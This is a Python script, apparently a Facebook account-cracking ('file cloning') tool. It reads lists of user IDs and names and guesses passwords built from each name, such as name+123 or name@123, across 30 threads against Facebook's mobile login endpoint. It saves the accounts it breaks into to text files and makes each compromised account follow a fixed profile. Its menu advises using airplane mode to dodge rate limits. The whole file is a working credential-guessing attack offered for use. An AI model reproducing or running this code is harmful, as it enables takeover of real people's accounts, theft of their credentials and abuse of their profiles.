#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
   \033[1;37m 
 .d8888b.     88888888888 888888 
d88P  Y88b        888       "88b 
Y88b.             888        888 
 "Y888b.          888        888 
    "Y88b.        888        888 
      "888        888        888 
Y88b  d88P d8b    888  d8b   88P 
 "Y8888P"  Y8P    888  Y8P   888 
                           .d88P 
                         .d88P"  
                        888P"    
                                                                           
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           SUJAL
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          BROKEN
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             69
\033[1;37m------------------------\033[1;37m------------------------ """                                              

def hasil(ok,cp):
	if not len(ok) != 0:
	    pass
	if len(cp) != 0:
	   	print(f' Crack Selesai')	
	print(f' OK : %s '%(ok))
	print(f' CP : %s '%(cp))
	input('Press enter to back SSB Menu ')
	sarfraz()

def sarfraz():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Start File Cloning')
    print(' [2] Contact Owner')
    print(' [3] Ask For Approval')
    print(' [E] exit ')
    print('')
    _sarfraz___ = input(' [?] Choose option : ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        os.system("xdg-open https://www.facebook.com/hacker.ffx8188181")
    if _sarfraz___ in ('3', '03'):
        xoshnaw()
    if _sarfraz___ in ('E', 'ee'):
        pass



class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[SUJAL] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":"m.facebook.com",
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Opera/9.80 (Android; Opera Mini/7.5.33361/191.273; U; pt) Presto/2.12.423 Version/12.16 UNTRUSTED/1.0",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://mbasic.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f'https://m.facebook.com/login.php?skip_api_login=1&api_key=410740733452846&kid_directed_site=0&app_id=410740733452846&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D410740733452846%26redirect_uri%3Dhttps%253A%252F%252Fdesawisatajanggadolok.com%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3D0DtZqGnEJZ4qUreWFQ3UaCTDr5xXyZTCsaDBtAXO%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D267097fb-5e29-44fa-a8a7-6d55d7a03ccb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fdesawisatajanggadolok.com%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0DtZqGnEJZ4qUreWFQ3UaCTDr5xXyZTCsaDBtAXO%23_%3D_&displ', headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":"m.facebook.com",
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://m.facebook.com",
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [SUJAL-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('SUJAL_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [SUJAL-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SUJAL_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [SUJAL-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('SUJAL_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] Crack With Auto Pass ')
        print('[2] Crack With Name Digit Pass')
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;31m\r Use flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"123456", xz[0]+"786", xz[0]+"@123", xz[0]+"@1234", xz[0]+"@1235", xz[0]+"@@", xz[0]+"123@@", xz[0]+"@@@"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"123456", xz[0]+"786", xz[0]+"@123", xz[0]+"@1234", xz[0]+"@1235", xz[0]+"@@", xz[0]+"123@@", xz[0]+"@@@"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"123456", xz[0]+"786", xz[0]+"@123", xz[0]+"@1234", xz[0]+"@1235", xz[0]+"@@", xz[0]+"123@@", xz[0]+"@@@"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"123456", xz[0]+"786", xz[0]+"@123", xz[0]+"@1234", xz[0]+"@1235", xz[0]+"@@", xz[0]+"123@@", xz[0]+"@@@"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"123456", xz[0]+"786", xz[0]+"@123", xz[0]+"@1234", xz[0]+"@1235", xz[0]+"@@", xz[0]+"123@@", xz[0]+"@@@"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()
    
    
sarfraz()